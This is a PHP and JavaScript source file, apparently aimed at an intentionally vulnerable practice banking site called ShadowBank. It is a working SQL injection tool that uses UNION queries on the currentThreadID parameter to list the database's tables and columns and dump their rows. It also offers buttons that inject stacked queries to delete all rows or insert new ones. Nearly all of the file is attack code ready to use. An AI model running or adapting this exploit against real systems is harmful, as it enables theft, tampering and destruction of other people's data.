<html>
<head>
<script src="https://code.jquery.com/jquery-3.4.1.min.js" ></script>
</head>
<body>
<?php

function firstColumn($source){
    return $source[0];
}

$xml = file_get_contents("https://34-222-12-88-shadowbank.vulnerablesites.net/ShadowBank/showThread.action?currentThreadID=3%20union%20select%20null,null,%27!TARGET!%27,null,null,null%20%20--");
$xml = preg_replace("/jsessionid=[A-Z0-9]{32}/","",$xml);
$xml = str_replace("<a id=\"last\"></a>","", $xml);
$expectedContent = explode("!TARGET!",$xml);

//echo(htmlspecialchars($expectedContent[0]));

function executeQuery($table, $columns, $where = ""){
    global $expectedContent;
    $columnsSql = join(",'@@@',", $columns);
    $sql = "select null,null,CONCAT(':::_',$columnsSql,'_:::'),null,null,null from $table $where";
    $url = "https://34-222-12-88-shadowbank.vulnerablesites.net/ShadowBank/showThread.action?currentThreadID=3+union+" . urlencode($sql) . "+--+";
    $xml = file_get_contents($url);
    $xml = preg_replace("/jsessionid=[A-Z0-9]{32}/","",$xml);
    $xml = str_replace("<a id=\"last\"></a>","", $xml);
    $xml = str_replace($expectedContent[0],"",str_replace($expectedContent[1],"",$xml));
    $xml = $xml . "a";
    $results = [];
    $resultSplit = explode(":::_", $xml);
    foreach ($resultSplit as $resultRow){
        if($resultRow == "") continue;
        $rawData = explode("_:::",$resultRow)[0];
        if( strpos($rawData, '@@@') !== false ){
            array_push($results, explode("@@@",$rawData));
        }else{
            array_push($results, [$rawData]);
        }
        
    }
    return $results;
}

$tables = executeQuery("information_schema.tables",["TABLE_SCHEMA","table_name"],"where TABLE_SCHEMA='bank'");
foreach($tables as $table){
    $qualifiedTableName = "$table[1]";
    echo("<h1>$qualifiedTableName</h1>");
    $tableColumns = executeQuery("information_schema.columns", ["COLUMN_NAME","DATA_TYPE"], "where TABLE_NAME='$table[1]'");
    $tableData = executeQuery($qualifiedTableName, array_map("firstColumn", $tableColumns));
    ?>
        <table>
            <tr>
                <?php
                    foreach($tableColumns as $column){
                        ?><th><?php echo("$column[0]:$column[1]") ?></th><?php
                    }
                ?>
                <th><input type="button" value="truncate" onclick="deleteAll('<?php echo("$qualifiedTableName") ?>')"></th>
            </tr>
            <?php
            foreach($tableData as $row){
                echo("<tr>");
                    foreach($row as $columnData){
                        echo("<td>$columnData</td>");
                    }
                    echo("<td></td>");
                echo("</tr>");
            }
            ?>
            <tr>
                <?php
                    foreach($tableColumns as $column){
                        ?><td><input type="text" data-table="<?php echo("$qualifiedTableName") ?>" data-column="<?php echo("$column[0]") ?>" /></td><?php
                    }
                ?>
                <td><input type="button" value="Insert" onclick="insert('<?php echo("$qualifiedTableName") ?>')"/></td>
            </tr>

        </table>
    <?php
}

?>
<script>
    function deleteAll(tableName){
        var sql = `delete from ${tableName}`;
        executeSql(sql);
    }
    function insert(tableName){
        var columns = "";
        var values = "";
        
        $(`[data-table="${tableName}"]`).each((_,elem)=>{
            if($(elem).val() == "") return;
            columns += $(elem).data("column") + ","
            values += "'" + $(elem).val() + "',"
        });
        columns=columns.substring(0, columns.length -1);
        values=values.substring(0, values.length -1);
        
        var sql = `insert into ${tableName}(${columns}) values(${values});`
        executeSql(sql);
    }

    function executeSql(sql){
        sql = encodeURI(sql);
        window.open("https://34-222-12-88-shadowbank.vulnerablesites.net/ShadowBank/showThread.action?currentThreadID=3; " + sql + " --")
    }
</script>
</body>
</html>